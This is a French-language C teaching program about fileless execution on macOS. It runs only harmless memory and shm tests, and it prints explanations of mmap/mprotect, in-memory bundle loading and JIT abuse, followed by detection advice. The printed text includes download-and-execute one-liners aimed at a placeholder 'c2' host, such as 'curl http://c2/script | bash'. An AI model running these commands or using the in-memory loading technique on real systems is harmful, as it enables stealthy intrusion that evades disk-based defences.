/*
 * OBJECTIF  : Comprendre l'execution fileless sur macOS
 * PREREQUIS : Bases C, Mach-O, dyld, memoire virtuelle
 * COMPILE   : clang -o example example.c
 *
 * Ce programme demontre les techniques d'execution fileless
 * sur macOS : memory-only execution, interpretes, dylib
 * en memoire, et detection.
 * Demonstration pedagogique.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <mach/mach.h>

/*
 * Etape 1 : Concept d'execution fileless
 */
static void explain_fileless_concept(void) {
    printf("[*] Etape 1 : Execution fileless macOS\n\n");

    printf("    ┌──────────────────────────────────────────┐\n");
    printf("    │  Execution fileless                       │\n");
    printf("    │                                          │\n");
    printf("    │  Traditionnel :                          │\n");
    printf("    │  Disque -> Charge -> Execute              │\n");
    printf("    │  (detectable par AV/EDR sur le disque)   │\n");
    printf("    │                                          │\n");
    printf("    │  Fileless :                               │\n");
    printf("    │  Reseau -> Memoire -> Execute             │\n");
    printf("    │  (pas de fichier sur le disque)           │\n");
    printf("    │                                          │\n");
    printf("    │  Avantages :                              │\n");
    printf("    │  - Pas de fichier = pas de scan disque   │\n");
    printf("    │  - Pas de quarantine attribute            │\n");
    printf("    │  - Pas de Gatekeeper check               │\n");
    printf("    │  - Difficile a retrouver en forensics     │\n");
    printf("    └──────────────────────────────────────────┘\n\n");
}

/*
 * Etape 2 : Execution en memoire avec mmap
 */
static void demo_mmap_execution(void) {
    printf("[*] Etape 2 : Execution en memoire (mmap)\n\n");

    printf("    Allocation de memoire executable :\n");
    printf("    ───────────────────────────────────\n");

    /* Demo : allocation RWX et ecriture */
    size_t size = 4096;
    void *mem = mmap(NULL, size,
                     PROT_READ | PROT_WRITE,
                     MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);

    if (mem != MAP_FAILED) {
        printf("    Memoire allouee a : %p\n", mem);

        /* Ecrire du code (NOP sled comme exemple) */
        memset(mem, 0x90, 16); /* NOPs x86 comme demo */

        /* Changer en RX (W2X policy sur Apple Silicon) */
        int ret = mprotect(mem, size, PROT_READ | PROT_EXEC);
        if (ret == 0) {
            printf("    Permission changee en RX : succes\n");
        } else {
            printf("    mprotect RX : refuse (W^X policy)\n");
        }

        munmap(mem, size);
        printf("    Memoire liberee\n\n");
    } else {
        printf("    mmap : echec\n\n");
    }

    printf("    Note : Apple Silicon enforce W^X :\n");
    printf("    - Memoire ne peut PAS etre W et X simultanement\n");
    printf("    - Il faut : W -> RX (mprotect apres ecriture)\n");
    printf("    - pthread_jit_write_protect_np() pour JIT\n\n");
}

/*
 * Etape 3 : Execution via interpretes
 */
static void explain_interpreter_execution(void) {
    printf("[*] Etape 3 : Execution fileless via interpretes\n\n");

    printf("    Interpretes disponibles sur macOS :\n");
    printf("    ───────────────────────────────────\n");

    /* Verifier les interpretes disponibles */
    const char *interpreters[] = {
        "/usr/bin/python3", "/usr/bin/ruby",
        "/usr/bin/perl", "/usr/bin/osascript",
        "/bin/bash", "/bin/zsh", NULL
    };

    for (int i = 0; interpreters[i]; i++) {
        struct stat st;
        printf("    %-25s : %s\n", interpreters[i],
               stat(interpreters[i], &st) == 0 ? "present" : "absent");
    }
    printf("\n");

    printf("    Techniques fileless via interpretes :\n");
    printf("    ───────────────────────────────────\n");
    printf("    1. Python one-liner :\n");
    printf("       python3 -c 'import os; os.system(\"id\")'\n\n");
    printf("    2. Bash process substitution :\n");
    printf("       /bin/bash <(curl -s http://c2/payload)\n\n");
    printf("    3. osascript en memoire :\n");
    printf("       osascript -e 'do shell script \"whoami\"'\n\n");
    printf("    4. Pipe depuis le reseau :\n");
    printf("       curl http://c2/script | bash\n\n");
    printf("    5. Here-doc execution :\n");
    printf("       /bin/bash <<< \"$(curl -s http://c2/cmd)\"\n\n");
}

/*
 * Etape 4 : Dylib en memoire
 */
static void explain_memory_dylib(void) {
    printf("[*] Etape 4 : Chargement de dylib en memoire\n\n");

    printf("    Technique NSCreateObjectFileImageFromMemory :\n");
    printf("    ───────────────────────────────────\n");
    printf("    #include <mach-o/dyld.h>\n\n");
    printf("    // Charger un Mach-O bundle depuis la memoire\n");
    printf("    NSObjectFileImage image;\n");
    printf("    NSCreateObjectFileImageFromMemory(\n");
    printf("        buffer, buffer_size, &image);\n\n");
    printf("    NSModule module = NSLinkModule(\n");
    printf("        image, \"injected\",\n");
    printf("        NSLINKMODULE_OPTION_PRIVATE);\n\n");
    printf("    // Recuperer un symbole\n");
    printf("    NSSymbol sym = NSLookupSymbolInModule(\n");
    printf("        module, \"_main\");\n");
    printf("    void (*func)(void) = NSAddressOfSymbol(sym);\n");
    printf("    func();\n\n");

    printf("    Limitations :\n");
    printf("    - Fonctionne uniquement avec des bundles MH_BUNDLE\n");
    printf("    - Pas avec MH_DYLIB ou MH_EXECUTE\n");
    printf("    - API deprecee mais encore fonctionnelle\n\n");

    printf("    Alternative : dlopen + fd memoire :\n");
    printf("    ───────────────────────────────────\n");
    printf("    // macOS n'a pas memfd_create\n");
    printf("    // Utiliser shm_open + shm_unlink\n");
    printf("    int fd = shm_open(\"/payload\", O_CREAT|O_RDWR, 0);\n");
    printf("    ftruncate(fd, size);\n");
    printf("    write(fd, dylib_data, size);\n");
    printf("    shm_unlink(\"/payload\");\n");
    printf("    // Le fd reste valide mais pas de fichier\n");
    printf("    dlopen(\"/dev/fd/N\", RTLD_NOW); // ne fonctionne pas\n");
    printf("    // -> macOS bloque cette technique (AMFI)\n\n");
}

/*
 * Etape 5 : Techniques specifiques macOS
 */
static void explain_macos_specific(void) {
    printf("[*] Etape 5 : Techniques specifiques macOS\n\n");

    printf("    1. JIT avec MAP_JIT :\n");
    printf("    ───────────────────────────────────\n");
    printf("    void *jit_mem = mmap(NULL, size,\n");
    printf("        PROT_READ | PROT_WRITE | PROT_EXEC,\n");
    printf("        MAP_PRIVATE | MAP_ANONYMOUS | MAP_JIT, -1, 0);\n");
    printf("    // Necessite l'entitlement :\n");
    printf("    // com.apple.security.cs.allow-jit\n\n");

    printf("    2. Abuser d'apps avec JIT :\n");
    printf("    ───────────────────────────────────\n");
    printf("    -> Safari, Chrome ont JIT pour JavaScript\n");
    printf("    -> Injection dans ces processus = JIT possible\n\n");

    printf("    3. Pseudo-fileless avec /dev/shm :\n");
    printf("    ───────────────────────────────────\n");

    /* Tester shm_open */
    printf("    Test shm_open :\n");
    int fd = shm_open("/test_fileless", O_CREAT | O_RDWR, 0600);
    if (fd >= 0) {
        printf("      shm_open : OK (fd=%d)\n", fd);
        shm_unlink("/test_fileless");
        close(fd);
        printf("      shm_unlink : nettoye\n");
    } else {
        printf("      shm_open : non disponible\n");
    }
    printf("\n");

    printf("    4. NSAppleScript en memoire :\n");
    printf("    ───────────────────────────────────\n");
    printf("    // Objective-C\n");
    printf("    NSAppleScript *script = [[NSAppleScript alloc]\n");
    printf("        initWithSource:@\"do shell script ...\"];\n");
    printf("    [script executeAndReturnError:nil];\n\n");
}

/*
 * Etape 6 : Detection et protection
 */
static void explain_detection(void) {
    printf("[*] Etape 6 : Detection et protection\n\n");

    printf("    Detection :\n");
    printf("    ───────────────────────────────────\n");
    printf("    - Surveiller les allocations RWX (vmmap)\n");
    printf("    - Monitorer les appels mmap/mprotect\n");
    printf("    - Detecter les pipes depuis le reseau\n");
    printf("    - Surveiller curl/wget + pipe vers bash\n");
    printf("    - Endpoint Security (mmap events)\n\n");

    printf("    Commandes :\n");
    printf("    ───────────────────────────────────\n");
    printf("    # Regions memoire d'un processus\n");
    printf("    vmmap <pid>\n\n");
    printf("    # Chercher les regions RWX\n");
    printf("    vmmap <pid> | grep 'rwx'\n\n");
    printf("    # Monitorer les executions\n");
    printf("    sudo eslogger exec\n\n");

    printf("    Protections macOS :\n");
    printf("    ───────────────────────────────────\n");
    printf("    - W^X : pas de memoire W+X simultanee\n");
    printf("    - AMFI : verifie les signatures\n");
    printf("    - SIP : protege les processus systeme\n");
    printf("    - Hardened Runtime : restrictions memoire\n");
    printf("    - MAP_JIT necessite un entitlement\n\n");
}

int main(void) {
    printf("[*] Demo : Fileless macOS\n\n");

    explain_fileless_concept();
    demo_mmap_execution();
    explain_interpreter_execution();
    explain_memory_dylib();
    explain_macos_specific();
    explain_detection();

    printf("[+] Demo terminee avec succes\n");
    return 0;
}
